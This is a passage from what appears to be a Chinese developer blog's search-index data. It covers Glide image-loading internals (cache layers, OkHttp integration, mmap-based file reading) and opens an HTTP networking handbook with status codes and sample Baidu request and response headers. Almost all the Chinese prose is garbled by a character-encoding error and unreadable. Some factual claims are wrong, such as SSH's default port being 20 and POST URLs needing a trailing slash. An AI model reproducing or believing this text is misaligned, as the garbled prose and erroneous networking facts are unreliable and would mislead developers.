resource, GlideAnimation&lt;? super Bitmap&gt; glideAnimation) { } @Override public void onDestroy() { super.onDestroy(); //å…¶å®è¿™é‡Œé¢æ˜¯ç©ºæ–¹æ³•ã€‚ } }); 4.ç¼“å­˜è·¯å¾„è·å– Glide.with(itemView.getContext()) .load(&quot;&quot;) .downloadOnly(new BaseTarget&lt;File&gt;() { @Override public void onResourceReady(File resource, GlideAnimation&lt;? super File&gt; glideAnimation) { Log.d(TAG, resource.getAbsoluteFile()); //æ”¾å¿ƒï¼Œéƒ½åœ¨ä¸»çº¿ç¨‹ } @Override public void getSize(SizeReadyCallback cb) { } }); æ ¹æ®ä¹‹å‰çš„åˆ†æï¼Œæ‰“å°å‡ºæ¥çš„åº”è¯¥æ˜¯context.getCacheDir+â€image_manager_disk_cacheâ€+â€/xxxxxx.xxxâ€ ï¼Œæˆ‘æ²¡ç ”ç©¶è¿‡åç¼€ï¼Œä¸è¿‡è¿™ä¸ªåç¼€æ²¡æ„ä¹‰å§ã€‚ åœ¨2017å¹´çš„Droidcon2017NYCä¸Šï¼Œæœ‰ä¸€ä¸ªæ¼”è®²æåˆ°äº†å…³äºå›¾ç‰‡å°ºå¯¸å¤§å°å’Œå†…å­˜å…³ç³»ã€‚å¤§è‡´æƒ…å½¢å°±æ˜¯åœ¨ä½¿ç”¨åŠ è½½å›¾ç‰‡çš„æ—¶å€™ï¼Œä½¿ç”¨äº†ä¸€å¼ 3594pixel5421pixel(1900ä¸‡åƒç´ )çš„å›¾ç‰‡ï¼ˆå†…å­˜å ç”¨19million pixels X 4 bytes/pixel = 78MBï¼‰ï¼Œå¡«è¿›äº†ä¸€ä¸ª50dp50dpçš„avatarä¸­ã€‚è€Œå¦‚æœä½¿ç”¨å’ŒImageViewå¤§å°ä¸€æ ·çš„å›¾ç‰‡æºçš„è¯(150pxX150px)ï¼Œåªéœ€è¦90kbã€‚è¿™ä¹‹é—´çš„å†…å­˜æ¶ˆè€—å·®å¼‚å‡ ä¹æ˜¯1000å€ã€‚è¿™ä½speakerè¯´çš„è§£å†³æ–¹æ¡ˆæ˜¯è¯·æ±‚å›¾ç‰‡æ˜¯åŠ ä¸Šå®½åº¦å’Œé«˜åº¦å‚æ•°ï¼Œæˆ–è€…è°ƒç”¨Picassoçš„fitæ–¹æ³•ã€‚ç›®å‰çœ‹æ¥ï¼ŒGlideä»onSizeReadyä¹‹åè·å–èµ„æºçš„æ¯ä¸€æ­¥ï¼Œè¯»å–ç¼“å­˜ï¼Œè¯»ç£ç›˜ï¼Œè§£ç å›¾ç‰‡è¿™äº›è¿‡ç¨‹éƒ½å¸¦ä¸Šäº†widthå’Œheightå‚æ•°ï¼Œæ‰€ä»¥åº”è¯¥ä¹Ÿæ˜¯ä¸å­˜åœ¨è¿™ç§æµªè´¹å†…å­˜çš„é—®é¢˜ - æ€»ç»“ 4å±‚ç¼“å­˜ï¼ˆMemoryCacheæ˜¯å†…å­˜ä¸­çš„ä¸€å±‚ï¼ŒactiveResourcesæ˜¯ä¸€å±‚ï¼ˆHashMapï¼‰,cacheServiceå’ŒSourceServiceè¿™ä¿©çº¿ç¨‹æ± å¹²æ´»éœ€è¦ä¸€ä¸ªDiskLruCacheï¼Œå¦å¤–decodeè¿˜æœ‰ä¸€ä¸ªbitmapPoolï¼Œå…¶å®è¿™ä¸ç®—ç¼“å­˜å§ï¼‰ã€‚ é»˜è®¤çš„ç¼“å­˜å¤§å°è€ƒè™‘äº†å±å¹•å°ºå¯¸å’Œå¯ç”¨å†…å­˜å¤§å°ï¼Œç§‘å­¦åˆç†ã€‚çº¿ç¨‹æ± çš„keepAliveæ•°é‡ä¸Šï¼Œä¸€ä¸ªæ˜¯å¯ç”¨cpuæ ¸å¿ƒæ•°ï¼Œæ‰€ä»¥å¿«å§ï¼Œä¸€ä¸ªæ˜¯1ã€‚ å…¨å±€åªæœ‰ä¸€ä¸ªGlide,ä¸€ä¸ªé¡µé¢åªæœ‰ä¸€ä¸ªRequestManager Targetæ˜¯ä¸€ä¸ªæ¥å£ï¼Œå°†èµ„æºçš„å—ä¼—æŠ½è±¡æˆä¸€ä¸ªæ¥å£ã€‚ setTagä¼šå´©ï¼ŒListView,RecyclerViewåŸç†,åŠ è½½ä¼˜åŒ–(prefetcherä»€ä¹ˆçš„ï¼Œæ»‘åŠ¨è¿‡ç¨‹ä¸­ä¸å»åŠ è½½å›¾ç‰‡ï¼ŒGlideåªæ˜¯å–æ¶ˆäº†ä¹‹å‰çš„è¯·æ±‚ï¼Œå¹¶æœªå»prefetch,å…¶å®å¯ä»¥å•Šï¼Œç½‘ç»œå·®çš„æ—¶å€™ï¼ŒdownloadOnlyå°±å¥½äº†å˜›ï¼Œä¸‹æ¬¡ä¼šå¿«ä¸€ç‚¹ç‚¹) ä¼ è¿›å»çš„æ˜¯contextï¼Œä½†å®ƒåªæ˜¯å€Ÿç”¨context.getApplicationContextï¼Œä¿ç•™ä¸‹æ¥çš„æ˜¯ApplicationContextï¼Œå“ªæœ‰é‚£ä¹ˆå®¹æ˜“leakã€‚ ç”Ÿå‘½å‘¨æœŸæŒ‚é’©ä»€ä¹ˆï¼Œåˆ›å»ºä¸€ä¸ªæ²¡æœ‰Viewçš„SupportFragmentï¼Œè¿˜æ˜¯åšçš„å¾ˆå·§å¦™çš„ã€‚ æ³›å‹å†™çš„å„ç§ç»•ã€‚ã€‚ã€‚ ç°åœ¨æ¥å›ç­”é‚£ä¸ªé—®é¢˜ï¼šâ€œå¦‚æœä½ æ¥è®¾è®¡ä¸€ä¸ªå›¾ç‰‡åŠ è½½æ¡†æ¶ï¼Œä½ ä¼šæ€ä¹ˆè®¾è®¡ï¼Ÿâ€ ä¸€ä¸ªImagerLoaderåº”è¯¥å…·æœ‰çš„å‡ ä¸ªç‰¹æ€§åŒ…æ‹¬ï¼š å†…å­˜ç¼“å­˜å’Œç£ç›˜ç¼“å­˜,lru åšå¥½å›¾ç‰‡å‹ç¼©å’Œbitmapé‡ç”¨(ä¸å¯è§å›¾ç‰‡åŠæ—¶å›æ”¶)ï¼Œé¿å…oom (bitmapçš„å®½é«˜è¦æ ¹æ®Viewçš„å¤§å°ç¡®å®š) å¯¹äºä¸åŒèµ„æºæ¥æºèƒ½å¤Ÿæä¾›å¯¹åº”çš„DataFetcher å¯¹å¤–æä¾›start,stop,pause,resumeç­‰åŠŸèƒ½ï¼Œå¿…è¦æ—¶è‡ªåŠ¨è·Ÿè¸ªåº”ç”¨ç”Ÿå‘½å‘¨æœŸ è€—æ—¶æ“ä½œ(ioï¼Œè§£ç )æŒªåˆ°åå° å†…å­˜ç¼“å­˜å¯ä»¥è®¾è®¡ä¸¤å±‚bitmapç¼“å­˜ï¼Œä¸€å±‚æ˜¯ç›´æ¥æ‹¿æ¥ç”¨çš„(active)ï¼Œä¸€å±‚æ˜¯lruçš„ã€‚æ ¹æ®ç»éªŒï¼Œä¸€å¼ bitmapå å‡ ä¸ªMB(é«˜åˆ†è¾¨å±å¹•)ï¼Œè€Œä¸€ä¸ªAppèƒ½å¤Ÿä½¿ç”¨çš„æœ€å¤§heapå¤§å°ï¼ˆActivityManage.getMemoryClassï¼‰ä¸€èˆ¬åœ¨100å¤šMBï¼Œå–å…¶ä¸­çš„40%ã€‚å®Œå…¨èƒ½å¤Ÿåšåˆ°å†…å­˜ä¸­cacheåå‡ å¼ bitmapã€‚ å¤–éƒ¨è°ƒç”¨è€…éœ€è¦ä¼ å…¥èµ„æº(url,File,resï¼Œetc)ï¼ŒåŠImageViewå®ä¾‹(æˆ‘ä»¬ä¹Ÿå°±æœ‰äº†Context)ã€‚åœ¨onPreDrawä¹‹åè·å¾—Viewçš„å°ºå¯¸ï¼ˆè¿™ä¸€ç‚¹è‡³å…³é‡è¦ï¼‰ã€‚æ ¹æ®èµ„æºåœ°å€ç”Ÿæˆå”¯ä¸€çš„keyï¼Œåœ¨bitmap poolä¸­æŸ¥æ‰¾ï¼Œç„¶ååœ¨å†…å­˜ç¼“å­˜(lru)ä¸­æŸ¥æ‰¾ã€‚å¦‚æœè¿˜æœªæ‰¾åˆ°çš„è¯æäº¤DiskCacheæŸ¥æ‰¾è¯·æ±‚è¯·æ±‚åˆ°DiskCacheæŸ¥æ‰¾çº¿ç¨‹æ± ï¼Œå¦‚æœæœªæ‰¾åˆ°æäº¤è¯·æ±‚åˆ°èµ„æºè·å–çº¿ç¨‹æ± (ç½‘ç»œï¼Œæ–‡ä»¶ï¼Œæˆ–è€…Res)ï¼Œæ•°æ®è·å–å®Œæˆåcaheåˆ°diskå¹¶æäº¤åˆ°ä¸»çº¿ç¨‹ã€‚å¤šçº¿ç¨‹åŒæ­¥å’Œç”Ÿå‘½å‘¨æœŸè¿½è¸ªæ˜¯éš¾ç‚¹ã€‚ updateGlide 4.0ä¹‹åæä¾›äº†æ›´é«˜çš„å¯å®šåˆ¶åº¦ï¼Œå¦‚ä½•ä¸ºGlideè®¾å®šOkHttpClient @GlideModule private class CustomGlideModule extends AppGlideModule { @Override public void registerComponents(Context context, Glide glide, Registry registry) { OkHttpClient client = new OkHttpClient.Builder() .readTimeout(15, TimeUnit.SECONDS) .connectTimeout(15, TimeUnit.SECONDS) .build(); OkHttpUrlLoader.Factory factory = new OkHttpUrlLoader.Factory(client); glide.getRegistry().replace(GlideUrl.class, InputStream.class, factory); } } compile &quot;com.squareup.okhttp3:okhttp:3.8.1&quot; compile &#39;com.github.bumptech.glide:glide:4.0.0&#39; compile (&#39;com.github.bumptech.glide:okhttp3-integration:4.0.0&#39;){ exclude group: &#39;glide-parent&#39; } Glide 4.0çš„åŠ è½½é¡ºåºæ˜¯åœ¨DecodeJobçš„runGeneratorå†åˆ°startNextå†åˆ°loadDataã€‚çœ‹äº†ä¸‹ï¼Œæœ¬åœ°ç¼“å­˜æ–‡ä»¶æ˜¯ä½¿ç”¨ByteBufferFileLoaderï¼ˆå°±æ˜¯ç”¨java nioå»è¯»å–æ–‡ä»¶ï¼‰çš„åŠ è½½cacheçš„é¡ºåºè¿˜æ˜¯memory hit &gt; diskcache &gt; remote cache ã€‚åé¢ä¸¤ä¸ªéƒ½æ”¾åœ¨glide-disk-cache-threadä¸Šåšã€‚åœ¨DecodeJobçš„onResourceDecodedæ–¹æ³•ä¸­ï¼Œæœ‰è¿™ä¹ˆä¸€ä¸ªåˆ¤æ–­ if (dataSource != DataSource.RESOURCE_DISK_CACHE) { appliedTransformation = decodeHelper.getTransformation(resourceSubClass); transformed = appliedTransformation.transform(glideContext, decoded, width, height); } ä¹Ÿå³DiskCacheStrategy.RESOURCEä»¥åŠDiskCacheStrategy.ALLè¿™ç§ç±»å‹çš„ç¼“å­˜ç­–ç•¥åœ¨ç¬¬ä¸€æ¬¡loadå®Œdecodeå®Œä¹‹åã€‚ä¸‹æ¬¡ä»diskä¸­åŠ è½½çš„æ—¶å€™ç›´æ¥æ— è§†transformã€‚è¿˜æœ‰ï¼Œä»ä¸€ä¸ªfileä¸­decodeå‡ºbitmapçš„æ–¹æ³•æ˜¯ä»Downsampler.decodeStreamè¿™ä¸ªæ–¹æ³•é‡Œé¢è°ƒç”¨BitmapFactory.decodeStreamæ–¹æ³•æ¥åšçš„ å…ˆå°è¯•ç”¨ByteBufferGifDecoderå»decodeä¸‹è½½ä¸‹æ¥çš„èµ„æºï¼ˆå¤±è´¥äº†ä¸¢ä¸€ä¸ªGlideExceptionå‡ºæ¥ï¼‰ -&gt; æ¢ä¸‹ä¸€ä¸ª(ByteBufferBitmapDecoder) è¿™é‡Œé¢å°±æ˜¯è°ƒç”¨äº†BitmapFactory.decodeStream(Streamæ˜¯åŒ…è£…äº†ä¸€ä¸ªByteBufferStreamï¼Œè¯»å–çš„æ—¶å€™å®é™…ä¸Šè°ƒç”¨äº†byteBufferçš„ç›¸åº”æ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯ä½¿ç”¨äº†DirectByteBufferçš„å¯¹åº”æ–¹æ³•)è¿™ä¸ªæ–¹æ³•æ¥åˆ›å»ºbitmap å…³äºDirectByteBufferåœ¨glideä¸­çš„ä½¿ç”¨java.nio.DirectByteBufferè¿™ä¸ªclass,ä»æˆå‘˜å˜é‡æ¥çœ‹æœ‰MemoryBlock,ä»¥åŠFileChannel.MapModel public static ByteBuffer fromFile(@NonNull File file) throws IOException { RandomAccessFile raf = null; FileChannel channel = null; raf = new RandomAccessFile(file, &quot;r&quot;); channel = raf.getChannel(); return channel.map(FileChannel.MapMode.READ_ONLY, 0, fileLength).load(); //mapå°±æ˜¯mmapï¼Œè¿”å›çš„æ˜¯MappedByteBuffer,è¿™æ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œå®é™…åº”è¯¥æ˜¯DirectByteBuffer } å…¶å®å°±æ˜¯ä½¿ç”¨mmapå‡å°‘äº†å†…å­˜å¤åˆ¶çš„å¼€é”€ ä¸€äº›é»˜è®¤çš„é…ç½®å¦‚æœå¤–éƒ¨æ²¡æœ‰è®¾ç½®çš„è¯æ˜¯è¿™æ ·çš„ if (arrayPool == null) { arrayPool = new LruArrayPool(memorySizeCalculator.getArrayPoolSizeInBytes()); } if (memoryCache == null) { memoryCache = new LruResourceCache(memorySizeCalculator.getMemoryCacheSize()); } if (diskCacheFactory == null) { diskCacheFactory = new InternalCacheDiskCacheFactory(context); } tbdæ˜¯å¦å¯ä»¥åœ¨onSizeReadyä¹‹åä¿®æ”¹urlï¼Œæ·»åŠ ä¸Šä¸ƒç‰›çš„å®½é«˜å‚æ•°ï¼Ÿ å‚è€ƒ Android Glideæºç è§£æ","tags":[{"name":"android","slug":"android","permalink":"https://haldir65.github.io/tags/android/"}]},{"title":"ç½‘ç»œé€šä¿¡æ‰‹å†Œ","date":"2017-07-21T00:05:32.000Z","path":"2017/07/21/2017-07-21-network-manual/","text":"ç½‘ç»œç›¸å…³çš„æŸ¥æ‰¾æ‰‹å†Œ 1. URIå’ŒURLæ˜¯ä¸¤ä»¶äº‹æ ¹æ®wikiçš„è§£é‡ŠURLæ˜¯URIçš„å­é›†ï¼ŒURLçš„ä¸€èˆ¬æ ¼å¼åŒ…æ‹¬ä¸‰éƒ¨åˆ†ï¼šèµ„æºç±»å‹ã€å­˜æ”¾èµ„æºçš„ä¸»æœºåŸŸåï¼Œèµ„æºæ–‡ä»¶åã€‚ Uniform Resource Identifier (URI) âˆ’ a sequence of characters that allows the complete identification of any abstract or physical resource Uniform Resource Locator (URL) âˆ’ a subset of URI that, in addition to identifying where a resource is available, describes the primary mechanism to access itWe can conclude that every URL is a URI, but the opposite is not true protocol :// hostname[:port] / path / [;parameters][?query]#fragment Every URL has to start with any of these schemes: ftp, http, https, gopher, mailto, news, nntp, telnet, wais, file, or prospero. If it doesnâ€™t start with it, then itâ€™s not a URL. protocol æŒ‡ä½¿ç”¨çš„ä¼ è¾“åè®®(httpã€fileã€httpsã€mailtoã€ed2kã€thunderç­‰)hostname æ˜¯æŒ‡å­˜æ”¾èµ„æºçš„æœåŠ¡å™¨çš„åŸŸåç³»ç»Ÿ(DNS) ä¸»æœºåæˆ– IP åœ°å€ã€‚æœ‰æ—¶ï¼Œåœ¨ä¸»æœºåå‰ä¹Ÿå¯ä»¥åŒ…å«è¿æ¥åˆ°æœåŠ¡å™¨æ‰€éœ€çš„ç”¨æˆ·åå’Œå¯†ç ï¼ˆæ ¼å¼ï¼šusername:password@hostnameï¼‰ã€‚æœ‰æ—¶å€™æ˜¯ip,æœ‰æ—¶å€™å‰é¢è¿˜å¸¦è´¦å·å¯†ç port httpé»˜è®¤æ˜¯80ï¼Œhttpsæ˜¯443 ,sshé»˜è®¤ç«¯å£å·æ˜¯20path(è·¯å¾„) ç”±é›¶æˆ–å¤šä¸ªâ€œ/â€ç¬¦å·éš”å¼€çš„å­—ç¬¦ä¸²ï¼Œä¸€èˆ¬ç”¨æ¥è¡¨ç¤ºä¸»æœºä¸Šçš„ä¸€ä¸ªç›®å½•æˆ–æ–‡ä»¶åœ°å€ã€‚parametersï¼ˆå‚æ•°ï¼‰è¿™æ˜¯ç”¨äºæŒ‡å®šç‰¹æ®Šå‚æ•°çš„å¯é€‰é¡¹ã€‚query(æŸ¥è¯¢) ä¸€èˆ¬GETè¯·æ±‚å¯ä»¥åœ¨è¿™é‡Œé¢æŸ¥æ‰¾ã€‚å¯é€‰ï¼Œç”¨äºç»™åŠ¨æ€ç½‘é¡µï¼ˆå¦‚ä½¿ç”¨CGIã€ISAPIã€PHP/JSP/ASP/ASPã€‚NETç­‰æŠ€æœ¯åˆ¶ä½œçš„ç½‘é¡µï¼‰ä¼ é€’å‚æ•°ï¼Œå¯æœ‰å¤šä¸ªå‚æ•°ï¼Œç”¨â€œ&amp;â€ç¬¦å·éš”å¼€ï¼Œæ¯ä¸ªå‚æ•°çš„åå’Œå€¼ç”¨â€œ=â€ç¬¦å·éš”å¼€ã€‚fragmentï¼ˆä¿¡æ¯ç‰‡æ–­ï¼‰å­—ç¬¦ä¸²ï¼Œç”¨äºæŒ‡å®šç½‘ç»œèµ„æºä¸­çš„ç‰‡æ–­ã€‚ä¾‹å¦‚ä¸€ä¸ªç½‘é¡µä¸­æœ‰å¤šä¸ªåè¯è§£é‡Šï¼Œå¯ä½¿ç”¨fragmentç›´æ¥å®šä½åˆ°æŸä¸€åè¯è§£é‡Šã€‚ Data URI scheme 1.1 Httpçš„GETè¯·æ±‚çš„urlé•¿åº¦æ˜¯æœ‰é™åˆ¶çš„(æœåŠ¡å™¨å’Œæµè§ˆå™¨éƒ½é™åˆ¶äº†)Http1.1åè®®ä¸­å¹¶æ²¡æœ‰åšè¿™ä¸ªé™åˆ¶ï¼Œä½†é€šä¿¡çš„ä¸¤ç«¯ï¼ŒæœåŠ¡å™¨(Nginxå’ŒTomcat)å’Œå®¢æˆ·ç«¯(æµè§ˆå™¨å‚å•†)éƒ½åšäº†é™åˆ¶ã€‚å‚è€ƒä¸€äº›æµè§ˆå™¨çš„urlé•¿åº¦é™åˆ¶ï¼Œå³urlé•¿åº¦ä¸èƒ½è¶…è¿‡è¿™ä¹ˆå¤šä¸ªå­—ç¬¦ IE : 2803 Firefox:65536 Chrome:8182 Safari:80000 Opera:190000å†å…·ä½“ä¸€ç‚¹çš„è¯ï¼Œå°±æ˜¯ä¸‹é¢è¿™ä¸ªæˆ‘åœ¨ç™¾åº¦é‡Œæœç´¢zhihuè¿™ä¸ªè¯çš„æ—¶å€™GET /s?ie=utf-8&amp;f=8&amp;rsv_bp=0&amp;rsv_idx=1&amp;tn=baidu&amp;wd=zhihu&amp;rsv_pq=d66519eb000157d4&amp;rsv_t=4ce0B%2B8rfGgWxu9SAjGi7H5n5vylTydZebyyJXgD0JrPUSfBwp5zKxK9uKQ&amp;rqlang=cn&amp;rsv_enter=1&amp;rsv_sug3=6&amp;rsv_sug1=4&amp;rsv_sug7=100&amp;rsv_sug2=0&amp;inputT=3737&amp;rsv_sug4=4444 HTTP/1.1 ï¼ˆä»GETåˆ°è¿™é‡Œä¸èƒ½è¶…è¿‡8182ä¸ªå­—ï¼‰ Host: www.baidu.com Connection: keep-alive Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.101 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 DNT: 1 Accept-Encoding: gzip, deflate, br Accept-Language: zh-CN,zh;q=0.8 Cookie: BAIDUID=325243543:FG=1; PSTM=543534543; BIDUPSID=54353; pgv_pvi=5435; MCITY=-%3A; BD_HOME=0; BD_UPN=5435; H_PS_645EC=453453453; BDORZ=5435; BD_CK_SAM=1; PSINO=5; BDSVRTM=54; H_PS_PSSID=543; ispeed_lsm=2 å¦å¤–ï¼ŒCookieå°±æ˜¯ä¸€ä¸ªé”®å€¼å¯¹ï¼Œæ”¾åœ¨headeré‡Œé¢ï¼Œæ‰€ä»¥å¦‚æœæœåŠ¡å™¨å¯¹äºHttpè¯·æ±‚å¤´é•¿åº¦åšäº†é™åˆ¶ï¼ŒCookieä¹Ÿä¼šå—é™åˆ¶ã€‚ 1.2 GETå’ŒPOSTçš„ä¸€äº›å°åŒºåˆ«GETåªä¼šå‘ä¸€ä¸ªTCPåŒ…ï¼ŒPOSTå‘ä¸¤ä¸ª(ä¸€ä¸ªæ˜¯Header,ä¸€ä¸ªæ˜¯Body)ã€‚æ‰€ä»¥GETå¿«ä¸€ç‚¹ï¼ŒPOSTè¦æ±‚æœåŠ¡å™¨é•¿æ—¶é—´å¤„äºè¿æ¥çŠ¶æ€ï¼Œå¯èƒ½é€ æˆæœåŠ¡å™¨è´Ÿè½½å‡é«˜ã€‚ä¸€ä¸ªæ¯”è¾ƒå®åœ¨çš„ä¾‹å­æ˜¯ï¼Œæˆ‘åœ¨ä¸ƒç‰›çš„CDNä¸Šçœ‹åˆ°çš„æ”¶è´¹ä»·æ ¼1ä¸‡æ¬¡PUT/10ä¸‡æ¬¡GETçš„ä»·æ ¼æ˜¯ä¸€æ ·çš„ï¼Œä¸ç”¨æƒ³ä¹ŸçŸ¥é“GETå¯¹äºæœåŠ¡å™¨çš„å‹åŠ›è¦æ¯”PUTå° GETè¯·æ±‚æœ€åè·Ÿä¸è·Ÿæ–œæ â€/â€œæ— æ‰€è°“ï¼Œä½†æ˜¯POSTè¯·æ±‚æœ€åé¢å¾—è·Ÿâ€/â€œ(back slash) 2. httpè¯·æ±‚æœ¬è´¨ä¸Šæ˜¯å‘é€äº†ä¸€å †å­—ç¬¦ç»™æœåŠ¡å™¨å¦å¤–,domain(åŸŸå)æ˜¯æŒ‡www.wikipedia.orgè¿™ç§ï¼ŒDNSä¼šæŠŠå®ƒè½¬æˆä¸€ä¸ªipåœ°å€è€Œåœ¨httpè¯·æ±‚çš„headerä¸­ç»å¸¸æˆ–çœ‹åˆ°Host: www.baidu.com\\r\\n è¿™æ ·çš„ä¸€è¡Œï¼Œå…¶å®è¿™æ˜¯Httpå¤´å­—æ®µçš„æ ‡å‡†è¯·æ±‚å­—æ®µï¼Œæ€»ä¹‹å°±æ˜¯æ ‡å‡†ã€‚è¿™ä¸ªHostæŒ‡çš„æ˜¯æœåŠ¡å™¨çš„åŸŸåï¼Œå°±æ˜¯domainã€‚wikiä¸Šçš„httpåè¯è§£é‡Š 2.1 http statuscodeæœ‰äº›å¸¸ç”¨çš„è¿˜æ˜¯è¦è®°ä½çš„ï¼šæ¯”è¾ƒå¥½çš„ä¸€ä¸ªè¡¨æ ¼ 101 Switching Protocols (æ³¨æ„WebSocket)200 ä¸€åˆ‡æ­£å¸¸ï¼Œå¯¹GETå’ŒPOSTè¯·æ±‚çš„åº”ç­”æ–‡æ¡£è·Ÿåœ¨åé¢ã€‚201 Created æ¯”å¦‚åˆšåˆšå‘æœåŠ¡å™¨æäº¤äº†ä¸€æ¬¡POSTè¯·æ±‚åˆ›å»ºäº†ä¸€é¡¹èµ„æº301 Moved Permanently å®¢æˆ·è¯·æ±‚çš„æ–‡æ¡£åœ¨å…¶ä»–åœ°æ–¹ï¼Œæ–°çš„URLåœ¨Locationå¤´ä¸­ç»™å‡ºï¼Œæµè§ˆå™¨åº”è¯¥è‡ªåŠ¨åœ°è®¿é—®æ–°çš„URLã€‚302 Found ç±»ä¼¼äº301ï¼Œä½†æ–°çš„URLåº”è¯¥è¢«è§†ä¸ºä¸´æ—¶æ€§çš„æ›¿ä»£ï¼Œè€Œä¸æ˜¯æ°¸ä¹…æ€§çš„ã€‚304 Not Modified å®¢æˆ·ç«¯æœ‰ç¼“å†²çš„æ–‡æ¡£å¹¶å‘å‡ºäº†ä¸€ä¸ªæ¡ä»¶æ€§çš„è¯·æ±‚ï¼ˆä¸€èˆ¬æ˜¯æä¾›If-Modified-Sinceå¤´è¡¨ç¤ºå®¢æˆ·åªæƒ³æ¯”æŒ‡å®šæ—¥æœŸæ›´æ–°çš„æ–‡æ¡£ï¼‰ã€‚æœåŠ¡å™¨å‘Šè¯‰å®¢æˆ·ï¼ŒåŸæ¥ç¼“å†²çš„æ–‡æ¡£è¿˜å¯ä»¥ç»§ç»­ä½¿ç”¨ã€‚307 è¿™ä¸ªå…¶å®å’Œ302ä¸€ä¸ªæ„æ€ï¼Œåªæ˜¯302ä¼šæŠŠGETã€POSTè¿™äº›å…¨éƒ¨é‡å®šå‘åˆ°GETï¼Œè¿™ä¸ªæ˜¯è¯´ä½ å¯ä»¥ç”¨ä¹‹å‰çš„methodå†æ¥ä¸€æ¬¡401 Unauthorized403 Forbidden404 Not Found411 Length required414 Request URI Too Long URIå¤ªé•¿ï¼ˆHTTP 1.1æ–°ï¼‰ã€‚è¿™å°±æ˜¯ä¸Šé¢è¯´çš„Httpçš„GETè¯·æ±‚çš„urlé•¿åº¦æ˜¯æœ‰é™åˆ¶çš„ï¼Œæ˜¯æœåŠ¡å™¨æ–¹åšå‡ºçš„é™åˆ¶500 Internal Server Error502 Bad Gateway æœåŠ¡å™¨ä½œä¸ºç½‘å…³æˆ–è€…ä»£ç†æ—¶ï¼Œä¸ºäº†å®Œæˆè¯·æ±‚è®¿é—®ä¸‹ä¸€ä¸ªæœåŠ¡å™¨ï¼Œä½†è¯¥æœåŠ¡å™¨è¿”å›äº†éæ³•çš„åº”ç­”ã€‚503 Service Unavailable æœåŠ¡å™¨ç”±äºç»´æŠ¤æˆ–è€…è´Ÿè½½è¿‡é‡æœªèƒ½åº”ç­”ã€‚ä¾‹å¦‚ï¼ŒServletå¯èƒ½åœ¨æ•°æ®åº“è¿æ¥æ± å·²æ»¡çš„æƒ…å†µä¸‹è¿”å›503ã€‚æœåŠ¡å™¨è¿”å›503æ—¶å¯ä»¥æä¾›ä¸€ä¸ªRetry-Afterå¤´ã€‚å°±æ˜¯æœåŠ¡å™¨æ‰›ä¸ä½äº†çš„æ„æ€504 Gateway Timeout ç”±ä½œä¸ºä»£ç†æˆ–ç½‘å…³çš„æœåŠ¡å™¨ä½¿ç”¨ï¼Œè¡¨ç¤ºä¸èƒ½åŠæ—¶åœ°ä»è¿œç¨‹æœåŠ¡å™¨è·å¾—åº”ç­”ã€‚ï¼ˆHTTP 1.1æ–°ï¼‰RFCåœ¨è¿™é‡ŒhttpçŠ¶æ€ç 451ï¼Œç”±äºæ³•å¾‹ä¸Šçš„åŸå› ä¸èƒ½æ˜¾ç¤ºç½‘é¡µå†…å®¹[httpçŠ¶æ€ç 429 too many requests] http 411çš„è§£é‡Š:(ä¸ºäº†å…¼å®¹HTTP/1.0åº”ç”¨ç¨‹åºï¼ŒHTTP/1.1çš„è¯·æ±‚æ¶ˆæ¯ä½“ä¸­å¿…é¡»åŒ…å«ä¸€ä¸ªåˆæ³•çš„Content-Lengthå¤´å­—æ®µï¼Œé™¤éçŸ¥é“æœåŠ¡å™¨å…¼å®¹HTTP/1.1ã€‚ä¸€ä¸ªè¯·æ±‚åŒ…å«æ¶ˆæ¯ä½“ï¼Œå¹¶ä¸”Content-Lengthå­—æ®µæ²¡æœ‰ç»™å®šï¼Œå¦‚æœä¸èƒ½åˆ¤æ–­æ¶ˆæ¯çš„é•¿åº¦ï¼ŒæœåŠ¡å™¨åº”è¯¥ç”¨ç”¨400 (bad request) æ¥å“åº”ï¼›æˆ–è€…æœåŠ¡å™¨åšæŒå¸Œæœ›æ”¶åˆ°ä¸€ä¸ªåˆæ³•çš„Content-Lengthå­—æ®µï¼Œç”¨ 411 (length required)æ¥å“åº”ã€‚) 3. Headerç›¸å…³çš„é¦–å…ˆçœ‹ä¸‹è¯·æ±‚ç™¾åº¦é¦–é¡µçš„requestå’Œresponse Requestï¼ˆå…¶å®å‘é€çš„æ—¶å€™æ¯ä¸€è¡Œåé¢éƒ½è·Ÿäº†ä¸€ä¸ª\\r\\nç”¨äºæ¢è¡Œï¼‰ GET / HTTP/1.1 Host: www.baidu.com Connection: keep-alive Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 DNT: 1 Accept-Encoding: gzip, deflate, br Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.6,en;q=0.4 Cookie: BAIDUID=B41D39A8836273546754tC7F0C5DE315B64E2:FG=1; MCITY=-289%3A; Response(åŒæ ·ï¼Œæ— çº¿ç”µä¼ è¾“çš„æ—¶å€™æ˜¯æ²¡æœ‰æ¢è¡Œçš„æ¦‚å¿µçš„ï¼Œæ¯ä¸€è¡Œæœ«å°¾éƒ½æœ‰ä¸€ä¸ª\\r\\n) HTTP/1.1 200 OK Bdpagetype: 1 Bdqid: 0xa1524365407b7 Bduserid: 0 Cache-Control: private Connection: Keep-Alive Content-Encoding: gzip Content-Type: text/html; charset=utf-8 Cxy_all: baidu+9bdfb3567324332546a7cb482b3 Date: Sun, 23 Jul 2017 08:27:22 GMT Expires: Sun, 23 Jul 2017 08:26:51 GMT Server: BWS/1.1 Set-Cookie: BDSVRTM=0; path=/ Set-Cookie: BD_HOME=0; path=/ Set-Cookie: H_PS_PSSID=1430_210543_17001; path=/; domain=.baidu.com Strict-Transport-Security: max-age=172800 Vary: Accept-Encoding X-Powered-By: HPHP X-Ua-Compatible: IE=Edge,chrome=1 Transfer-Encoding: chunked æŠ¥æ–‡çš„è¯­æ³•ï¼šè¯·æ±‚çš„æ ¼å¼ æ³¨æ„ä¸Šé¢çš„â€œpath=/â€document.cookie = â€œusername=cfangxu;path=/;domain=qq.comâ€å¦‚ä¸Šï¼šâ€œwww.qq.com&quot; ä¸ 